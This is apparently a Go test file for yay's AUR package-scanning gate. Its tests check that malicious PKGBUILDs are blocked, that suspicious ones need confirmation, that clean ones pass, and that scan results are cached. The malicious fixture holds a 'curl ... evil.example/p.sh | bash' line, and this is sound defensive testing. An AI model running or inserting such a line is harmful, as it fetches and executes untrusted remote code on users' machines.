package workdir

import (
	"bytes"
	"context"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Jguer/yay/v13/pkg/settings"
	"github.com/Jguer/yay/v13/pkg/text"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

const scanTestMalicious = "package() {\n  curl -s https://evil.example/p.sh | bash\n}\n"
const scanTestSuspicious = "source=(\"http://192.0.2.10/foo.tar.gz\")\n"
const scanTestBenign = "pkgname=hello\npackage() {\n  make DESTDIR=\"$pkgdir\" install\n}\n"

func newScanTestPreparer(t *testing.T, input string, strict bool) (*Preparer, string, *bytes.Buffer) {
	t.Helper()
	buildDir := t.TempDir()
	cfg := settings.DefaultConfig("test")
	cfg.BuildDir = buildDir
	cfg.Scan = true
	cfg.ScanStrict = strict
	out := &bytes.Buffer{}
	logger := text.NewLogger(out, io.Discard, strings.NewReader(input), false, "test")
	preper := NewPreparerWithoutHooks(nil, nil, cfg, logger, true)
	return preper, buildDir, out
}

func scanTestDirs(t *testing.T, buildDir, base, pkgbuild string) map[string]string {
	t.Helper()
	dir := filepath.Join(buildDir, base)
	require.NoError(t, os.MkdirAll(dir, 0o755))
	require.NoError(t, os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(pkgbuild), 0o644))
	return map[string]string{base: dir}
}

func TestScanGateBlocksMalicious(t *testing.T) {
	preper, buildDir, _ := newScanTestPreparer(t, "", false)
	dirs := scanTestDirs(t, buildDir, "evil", scanTestMalicious)
	err := preper.scanAURPackages(context.Background(), dirs)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "refusing to build evil")

	_, statErr := os.Stat(filepath.Join(buildDir, "scan", "evil.scan.json"))
	assert.NoError(t, statErr, "a report must be written for the blocked package")
}

func TestScanGateSuspiciousRequiresConfirmation(t *testing.T) {
	preper, buildDir, _ := newScanTestPreparer(t, "n\n", false)
	dirs := scanTestDirs(t, buildDir, "sketchy", scanTestSuspicious)
	err := preper.scanAURPackages(context.Background(), dirs)
	require.Error(t, err, "declining the prompt must abort the install")

	preper, buildDir, _ = newScanTestPreparer(t, "y\n", false)
	dirs = scanTestDirs(t, buildDir, "sketchy", scanTestSuspicious)
	assert.NoError(t, preper.scanAURPackages(context.Background(), dirs))
}

func TestScanGateCleanPasses(t *testing.T) {
	preper, buildDir, out := newScanTestPreparer(t, "", false)
	dirs := scanTestDirs(t, buildDir, "hello", scanTestBenign)
	require.NoError(t, preper.scanAURPackages(context.Background(), dirs))
	assert.Contains(t, out.String(), "clean")
}

func TestScanPackageUsesCache(t *testing.T) {
	preper, buildDir, out := newScanTestPreparer(t, "", false)
	dirs := scanTestDirs(t, buildDir, "hello", scanTestBenign)

	report, err := ScanPackage(context.Background(), preper.cfg, preper.log, "hello", dirs["hello"])
	require.NoError(t, err)
	assert.False(t, report.Cached)

	out.Reset()
	cached, err := ScanPackage(context.Background(), preper.cfg, preper.log, "hello", dirs["hello"])
	require.NoError(t, err)
	assert.True(t, cached.Cached)
	assert.Contains(t, out.String(), "cached result")

	// Touching the PKGBUILD must invalidate the cached verdict.
	require.NoError(t, os.WriteFile(filepath.Join(dirs["hello"], "PKGBUILD"), []byte(scanTestMalicious), 0o644))
	fresh, err := ScanPackage(context.Background(), preper.cfg, preper.log, "hello", dirs["hello"])
	require.NoError(t, err)
	assert.False(t, fresh.Cached)
	assert.Equal(t, "malicious", string(fresh.Verdict))
}

func TestScanGateDisabled(t *testing.T) {
	preper, buildDir, _ := newScanTestPreparer(t, "", false)
	preper.cfg.Scan = false
	dirs := scanTestDirs(t, buildDir, "evil", scanTestMalicious)
	assert.NoError(t, preper.scanAURPackages(context.Background(), dirs), "--noscan must skip the gate entirely")
}

func TestScanGateDefaultsToOptIn(t *testing.T) {
	cfg := settings.DefaultConfig("test")
	assert.False(t, cfg.Scan, "upstream scanning must be opt-in")
	assert.False(t, cfg.ScanStrict)
}
